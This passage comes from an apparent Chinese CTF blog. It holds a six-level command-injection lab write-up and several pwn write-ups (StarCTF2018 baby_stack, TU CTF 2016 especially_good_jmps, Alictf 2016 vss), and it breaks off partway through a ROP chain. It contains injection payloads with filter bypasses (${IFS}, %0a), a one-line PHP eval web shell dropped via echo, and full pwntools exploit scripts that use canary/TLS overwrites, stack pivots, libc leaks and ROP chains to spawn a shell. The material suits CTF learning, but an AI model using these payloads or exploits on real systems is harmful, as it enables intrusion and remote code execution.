　　 （3）弹shell必须的，参考我自己的（http://www.cnblogs.com/KevinGeorge/p/8120226.html） </code></pre><p>————————————————<br>版权声明：本文为CSDN博主「iamsongyu」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/iamsongyu/article/details/84483638">https://blog.csdn.net/iamsongyu/article/details/84483638</a></p>
<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>没有任何过滤<br>127.0.0.1|ls<br>127.0.0.1|cat ```.php<br>F12看源码。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/OM37TH7SIQCK73E2G@8-1024x549.png" alt=""></p>
<hr>
<h2 id="第二关-过滤掉了cat"><a href="#第二关-过滤掉了cat" class="headerlink" title="第二关 过滤掉了cat"></a>第二关 过滤掉了cat</h2><p>还是先看<br>127.0.0.1|ls<br>127.0.0.1|c’a’t flag_110451125822562.php<br>F12出flag<br>上述是一种方法<br>还有一种可以传一句话木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php @eval(\$_POST[&#39;a&#39;]);?&gt;&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
<p>连shell就不展示了<img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/TW97C_BNTT6OS5SIP6KR5T-1024x549.png" alt=""></p>
<hr>
<h2 id="第三关-过滤空格"><a href="#第三关-过滤空格" class="headerlink" title="第三关 过滤空格"></a>第三关 过滤空格</h2><p>127.0.0.1|ls<br>我这里是运用了${IFS}来绕过了空格，我尝试了括号和url编码无果，<br>考虑使用了${IFS}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat$&#123;IFS&#125;flag_518528200601.php</span><br></pre></td></tr></table></figure>
<p>依然F12看源码得到flag<img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/8WDTY2X9QEABJHN12RC-1024x549.png" alt=""></p>
<hr>
<h2 id="第四关-过滤目录分隔符"><a href="#第四关-过滤目录分隔符" class="headerlink" title="第四关    过滤目录分隔符"></a>第四关    过滤目录分隔符</h2><p>目录分割符通常是’&#39;或者是’/‘<br>两者在python中都可用。<br>那么就用分号类似堆叠注入一样每个语句后加分号<br>127.0.0.1;ls<img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/N75J42DC_7H0GR1CV@W-1024x549.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls</span><br></pre></td></tr></table></figure>
<p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/PVJ6G54_V@CHJWI3C1IJ68-1024x549.png" alt=""><br>老套路<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/TXGPO8AN7WQTY@YQD6S-1024x549.png" alt=""></p>
<h2 id="第五关-过滤运算符"><a href="#第五关-过滤运算符" class="headerlink" title="第五关 过滤运算符"></a>第五关 过滤运算符</h2><p>同上关就可。这让我想到了是不是上一关有其他方法。<br>我去搜索了下。<br>得到结果其他人也是这么做的。<br>去搜索了有没有分号过滤以及绕过<br>没有得到什么结果（以后填坑）<br>第六关就填坑了。</p>
<h2 id="第六关-以上所有关全部过滤"><a href="#第六关-以上所有关全部过滤" class="headerlink" title="第六关 以上所有关全部过滤"></a>第六关 以上所有关全部过滤</h2><p>难道不是第二关+第三关+第四关就结束了？<br>好吧，看到题确实不是hhh。<br><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/SMGMUY4I11MUFXPC-1024x549.png" alt=""><br>毕竟是最后一个了，给大家分析一下吧<br>首先过滤了基本上面我所用过的所有命令分隔符。<br>那么在这里介绍一下另外两种分隔符<br>%0a(换行符) 、%0d(回车符)，并且在url下写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0Als#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/Y3JV8J5TMPO3OIXS9QX-1024x549.png" alt=""><br>注意只能在url写，否则会被二次编码导致失效。<br>那么就继续下一步。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;&#39;f&#39;lag_is_here%0als#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/F@Q@XEUE_YE2TW7G5A6-956x1024.png" alt=""><br>最后一把梭</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;&#39;f&#39;lag_is_here%0a&#39;c&#39;at$&#123;IFS&#125;&#39;f&#39;lag_256432033625740.php#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.zhaobairen.club/wp-content/uploads/2020/03/8EF1MBAB5TVTARMJ_XE-954x1024.png" alt=""><br>到此就结束一段了23333</p>
<hr>

        </div>
        
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-02-19T16:00:00.000Z">2020-02-20</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    6 分钟 读完 (大约 854 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/02/20/StarCTF2018%20baby_stack/">绕过Canary的其他姿势 StarCTF2018 baby_stack</a>
            
        </h1>
        <div class="content">
            <p>作者：LordRiot</p>
<h4 id="emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz-orz"><a href="#emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz-orz" class="headerlink" title="emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz orz"></a>emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz orz</h4><h3 id="StarCTF2018-baby-stack"><a href="#StarCTF2018-baby-stack" class="headerlink" title="StarCTF2018 baby_stack"></a>StarCTF2018 baby_stack</h3><p>今天等修手机的时候想起昨天看到ichunqiu新春战役的BFnote里利用覆写TLS结构体bypass了canary，于是就很好奇其具体原理，查了一波发现，那一题是利用libc2.23的特殊机制覆写了main线程的TLS，然后找到另一个覆写TLS结构体的题，即是本题，不过不同的是，本题直接利用pthread_create函数，加了个线程出来，然后由于该线程的栈在其TLS结构体之上，所以可以覆写成功。</p>
<p>这一题是我知道原理之后纯动调做的orz，就先打个断点，康康canary的值，之后跟进，直接find canary，查到其在内存中的所有位置，发现有四处，其中一处是在main线程的TLS，两处是在新线程的栈，一处是在新线程的TLS结构，然后算出偏移，直接全部覆写成’\x00’，然后由于改了TLS（TLS结构体里本身有些随机的量，例如一些在libc上的地址什么的，第一次覆写肯定无法保持，只能全覆写成0了），所以需要栈迁移一下，就read payload到新栈，然后劫持栈到新栈即可，然后似乎是由于payload长度的关系，我一度想写’/bin/sh\x00’，然后call system来getshell，但是始终不行，动调了俩小时，毫无起色，甚至我都跟着system源码单步调试了，发现似乎是payload的某个地方的覆写导致的，然后换成了one_gadget，一梭搞定，orz，原地自闭，下面贴一下exp。（one_gadget 我直接用的本地的，是2.27的，打远程的话，第一次leak出版本再获取一样的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;baby_stack&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; 0x4006F0</span><br><span class="line">read_got &#x3D; 0x601FD0</span><br><span class="line">puts_got &#x3D; 0x601FB0</span><br><span class="line">new_stack &#x3D; 0x602400</span><br><span class="line">init_pop &#x3D; 0x400B6A</span><br><span class="line">init_mov &#x3D; 0x400B50</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x400b73</span><br><span class="line">pop_rbp &#x3D; 0x4007d8</span><br><span class="line">leave &#x3D; 0x4008a6</span><br><span class="line"></span><br><span class="line">fake_canary &#x3D; &#39;\x00&#39; * 8</span><br><span class="line">first_offset &#x3D; 0xB0</span><br><span class="line">second_offset &#x3D; 0x820</span><br><span class="line"></span><br><span class="line">fake_TLS &#x3D; p64(0x603270)</span><br><span class="line">fake_TLS +&#x3D; p64(0)</span><br><span class="line">fake_TLS +&#x3D; p64(1)</span><br><span class="line">fake_TLS +&#x3D; p64(0)</span><br><span class="line">fake_TLS +&#x3D; fake_canary</span><br><span class="line"></span><br><span class="line">rop_chain &#x3D; p64(init_pop)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(1)</span><br><span class="line">rop_chain +&#x3D; p64(read_got)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack)</span><br><span class="line">rop_chain +&#x3D; p64(0x400)</span><br><span class="line">rop_chain +&#x3D; p64(init_mov)</span><br><span class="line">rop_chain +&#x3D; &#39;\x00&#39; * 0x38</span><br><span class="line">rop_chain +&#x3D; p64(pop_rbp)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack - 8)</span><br><span class="line">rop_chain +&#x3D; p64(leave)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;\x00&#39; * 0x101b</span><br><span class="line">payload +&#x3D; rop_chain</span><br><span class="line">payload +&#x3D; &#39;\x00&#39; * (second_offset - 16 - len(rop_chain))</span><br><span class="line">payload +&#x3D; fake_TLS</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;How many bytes do you want to send?&#39;)</span><br><span class="line">p.send(str(len(payload)))</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.send(&#39;\x00&#39; * 3)</span><br><span class="line"></span><br><span class="line">rop_chain &#x3D; p64(init_pop)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(1)</span><br><span class="line">rop_chain +&#x3D; p64(read_got)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack + 0x400)</span><br><span class="line">rop_chain +&#x3D; p64(0x400)</span><br><span class="line">rop_chain +&#x3D; p64(init_mov)</span><br><span class="line">rop_chain +&#x3D; &#39;\x00&#39; * 0x38</span><br><span class="line">rop_chain +&#x3D; p64(pop_rbp)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack + 0x400 - 8)</span><br><span class="line">rop_chain +&#x3D; p64(leave)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(pop_rdi)</span><br><span class="line">payload +&#x3D; p64(puts_got)</span><br><span class="line">payload +&#x3D; p64(puts_plt)</span><br><span class="line">payload +&#x3D; rop_chain</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;It\&#39;s time to say goodbye.&#39;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr &#x3D; u64(p.recv(6).ljust(8, &#39;\x00&#39;))</span><br><span class="line">obj &#x3D; LibcSearcher(&#39;puts&#39;, puts_addr)</span><br><span class="line">base_addr &#x3D; puts_addr - obj.dump(&#39;puts&#39;)</span><br><span class="line">one_gadget &#x3D; 0x4f322 + base_addr</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>本来还想水一期栈迁移和SROP的博客，但最近事情太多了，还要赶紧学堆，就先鸽了，以后有时间把return to VDSO和SROP一块写了: - )</p>

        </div>
        
        
        
    </div>
</div>








    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-02-19T16:00:00.000Z">2020-02-20</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    8 分钟 读完 (大约 1242 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/02/20/Easy_ROP%20points/">Easy_ROP points</a>
            
        </h1>
        <div class="content">
            <p>作者：LordRiot</p>
<h4 id="2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point"><a href="#2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point" class="headerlink" title="2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point: )"></a>2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point: )</h4><br>
这篇中出现的题均是ichunqiu中Linux Pwn基础ROP中的题目，题目中的exp可能有些libc环境问题，
具体地址数值不能直接代入，但思路均可参考:-(其实是我本地莫名加载不了题给libc 2333)

<h3 id="TU-CTF-2016-especially-good-jmps"><a href="#TU-CTF-2016-especially-good-jmps" class="headerlink" title="TU CTF 2016-especially good jmps"></a>TU CTF 2016-especially good jmps</h3><p>这个题一开始有些困扰我的点在于scanf读入数字之后没有清空缓冲区，<br>如果直接sendline(‘1’)这样，那么缓冲区的’\n’就会将下个gets截断，<br>于是想到在’1’后面加一个字母来截断scanf对整数的读取，相当于payload开头的第一个字符<br>之后的padding记得相应少一个字符即可，exp如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;especially_good_jmps&#39;)</span><br><span class="line">puts_got &#x3D; 0x0804A018</span><br><span class="line">puts_plt &#x3D; 0x080483E0</span><br><span class="line">main_addr &#x3D; 0x08048420</span><br><span class="line">sh_addr &#x3D; 0x08048293</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;\x00&quot; * 0x2C</span><br><span class="line">payload +&#x3D; p32(puts_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;name?\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;number?\n&#39;)</span><br><span class="line">p.send(&#39;1l&#39;)            #cut off the scanf() reading</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;odd number!\n&#39;)</span><br><span class="line">puts_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">obj &#x3D; LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">base_addr &#x3D; puts_addr - obj.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr &#x3D; base_addr + obj.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;a&quot; * 0x2b    #because of the &#39;l&#39; hence here is 0x2c - 1 &#x3D; 0x2b</span><br><span class="line">payload +&#x3D; p32(sys_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;name?\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;number?\n&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Alictf-2016-vss"><a href="#Alictf-2016-vss" class="headerlink" title="Alictf 2016-vss"></a>Alictf 2016-vss</h3><p>emmmmmm，算是我做过的第一个静态编译的题，一开始放到IDA里我直接懵了，800多个函数，我还以为是个逆向题，后来查了点相关资料，才知道是个静态编译题，即将libc中的函数直接放到程序里。然后就是函数认证的问题，因为反汇编是一堆sub_xxxxx，emmmmm一个一个看还是比较费劲的，需要从给IDA引入libc.sig文件，将<a href="https://github.com/push0ebp/sig-database">sig数据库</a>的sig文件导入IDA下的”/lscan/lscan/i386/sig”，然后在IDA中使用shift + F5即可应用，但是匹配度有多有少，这个题我最终用三个sig文件匹配到了400多个函数，我试了用github上一个lscan的工具，但是并不好用，匹配率4000+%就离谱，所以目前可能还是只能自己手动添加，不过有一些主要函数大致就够了，这题本身主要是利用抬栈执行ropchain即可，具体原理其实自己想下函数调用很好明白。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;vss&#39;)</span><br><span class="line"></span><br><span class="line">add_rsp &#x3D; 0x46f2f1</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;py&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload.ljust(0x48, &#39;a&#39;)</span><br><span class="line">payload +&#x3D; p64(add_rsp)</span><br><span class="line">payload &#x3D; payload.ljust(0x78, &#39;a&#39;) #to get the rop addr</span><br><span class="line"></span><br><span class="line"># the ropchain from ROPgadget:</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046f208) # pop rax ; ret</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401823) # pop rdi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043ae05) # pop rdx ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span 